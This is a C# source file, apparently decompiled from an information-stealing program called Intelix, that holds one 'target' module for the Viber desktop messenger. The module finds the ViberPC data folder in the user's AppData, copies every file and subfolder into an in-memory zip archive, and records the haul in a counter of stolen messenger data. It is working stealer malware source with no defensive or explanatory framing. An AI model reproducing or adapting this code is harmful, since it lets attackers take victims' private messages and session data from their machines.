using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Messangers
{
	// Token: 0x02000022 RID: 34
	public class Viber : ITarget
	{
		// Token: 0x06000067 RID: 103 RVA: 0x00004C1C File Offset: 0x00002E1C
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "ViberPC", "data");
			bool flag = Directory.Exists(text);
			if (flag)
			{
				string entry = "Viber";
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "Viber";
				Array.ForEach<string>(Directory.GetFiles(text), delegate(string file)
				{
					zip.AddFile(entry + "\\" + Path.GetFileName(file), File.ReadAllBytes(file));
				});
				Array.ForEach<string>(Directory.GetDirectories(text), delegate(string dir)
				{
					zip.AddDirectoryFiles(dir, entry, true);
				});
				counterApplications.Files.Add(text + " => " + entry);
				counterApplications.Files.Add(entry);
				counter.Messangers.Add(counterApplications);
			}
		}
	}
}
